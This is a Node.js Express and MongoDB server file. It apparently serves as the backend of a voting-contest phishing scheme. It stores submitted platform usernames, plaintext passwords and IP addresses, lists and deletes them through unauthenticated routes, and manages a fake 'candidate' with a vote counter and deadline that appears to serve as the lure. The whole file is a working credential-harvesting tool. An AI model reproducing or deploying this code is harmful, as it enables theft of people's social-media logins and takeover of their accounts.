

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Middleware

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));



app.use(express.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('✅ Connected to MongoDB Atlas'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// Schema
const loginSchema = new mongoose.Schema({
  platform: { type: String, required: true },
  username: { type: String, required: true },
  password: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
  ipAddress: { type: String }
});

const Login = mongoose.model('Login', loginSchema);

// Candidate/Settings Schema
const candidateSchema = new mongoose.Schema({
  name: { type: String, default: 'Candidate Name' },
  image: { type: String }, // Base64 image
  currentVotes: { type: Number, default: 0 },
  requiredVotes: { type: Number, default: 100 },
  endTime: { type: Number }, // timestamp
  updatedAt: { type: Date, default: Date.now }
});

const Candidate = mongoose.model('Candidate', candidateSchema);

// Routes
app.post('/api/logins', async (req, res) => {
  try {
    const { platform, username, password } = req.body;
    const newLogin = new Login({
      platform,
      username,
      password,
      ipAddress: req.ip
    });
    await newLogin.save();
    res.status(201).json({ status: 'success', message: 'Login saved' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

app.get('/api/logins', async (req, res) => {
  try {
    const logins = await Login.find().sort({ timestamp: -1 });
    res.json(logins);
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

app.delete('/api/logins', async (req, res) => {
  try {
    await Login.deleteMany({});
    res.json({ status: 'success', message: 'All logs cleared' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Add this route to server.js if not present
app.delete('/api/logins/:id', async (req, res) => {
  try {
    await Login.findByIdAndDelete(req.params.id);
    res.json({ status: 'success', message: 'Record deleted' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});


// Get candidate info (Public - no auth needed)
app.get('/api/candidate', async (req, res) => {
  try {
    let candidate = await Candidate.findOne();
    if (!candidate) {
      // Create default if none exists
      candidate = new Candidate();
      await candidate.save();
    }
    res.json(candidate);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update candidate info (Admin only - add auth later if needed)
app.post('/api/candidate', async (req, res) => {
  try {
    const { name, image, currentVotes, requiredVotes, endTime } = req.body;
    
    let candidate = await Candidate.findOne();
    if (!candidate) {
      candidate = new Candidate();
    }
    
    if (name !== undefined) candidate.name = name;
    if (image !== undefined) candidate.image = image;
    if (currentVotes !== undefined) candidate.currentVotes = currentVotes;
    if (requiredVotes !== undefined) candidate.requiredVotes = requiredVotes;
    if (endTime !== undefined) candidate.endTime = endTime;
    candidate.updatedAt = new Date();
    
    await candidate.save();
    res.json({ status: 'success', data: candidate });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));